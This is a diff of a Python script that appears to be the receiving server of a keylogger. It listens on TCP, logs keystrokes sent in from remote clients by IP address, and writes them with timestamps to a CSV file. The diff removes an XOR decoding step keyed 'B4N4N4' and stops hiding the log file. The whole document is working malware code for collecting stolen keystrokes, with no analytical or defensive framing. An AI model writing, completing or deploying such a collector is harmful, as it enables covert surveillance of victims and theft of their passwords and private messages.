@@ -1,17 +1,10 @@
 #!/usr/bin/env python3
 
-from os import getenv
 from socketserver import *
-from select import select
-from threading import Thread, current_thread
-from pwn import xor
-import logging
-import threading
+from threading import Thread
 from datetime import datetime
 
-import socket
 import pandas as pd
-import time
 
 
 def log_csv(ip_cli, ipt):
@@ -19,12 +12,12 @@ def log_csv(ip_cli, ipt):
         return
     df = pd.DataFrame({ip_cli: [ipt]})
     try:
-        old_df = pd.read_csv(".keylogs.csv").fillna(0)
+        old_df = pd.read_csv("keylogs.csv").fillna(0)
         df = pd.concat([df, old_df]).fillna(0)
     except FileNotFoundError:
-        open(".keylogs.csv", "w+").close()
+        open("keylogs.csv", "w+").close()
     finally:
-        df.to_csv(".keylogs.csv")
+        df.to_csv("keylogs.csv")
 
 
 class TCPHandler(BaseRequestHandler):
@@ -32,10 +25,8 @@ class TCPHandler(BaseRequestHandler):
     def handle(self):
         Red='\033[31m'          # Red
         Green='\033[32m'        # Green
-        Yellow='\033[33m'       # Yellow
-        Blue='\033[34m'         # Blue
         Cyan='\033[36m'         # Cyan
-        NC="\033[m"               # Color Reset 
+        NC="\033[m"               # Color Reset
 
         client = self.request.getpeername()
         ip_cli = f'{client[0]}:{client[1]}'
@@ -50,7 +41,6 @@ class TCPHandler(BaseRequestHandler):
             if not data:
                 continue
             #  Decode data here, before writing it into csv.
-            data = str(xor(data, 'B4N4N4'), 'ascii')
             cur_time = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
             print(f'{Green}[+] {Red}{cur_time}{NC}: Received new keystrokes from {Red}{ip_cli}{NC}:{Cyan} {data}{NC}')
             log_csv(ip_cli, f'{data}\n{cur_time}')
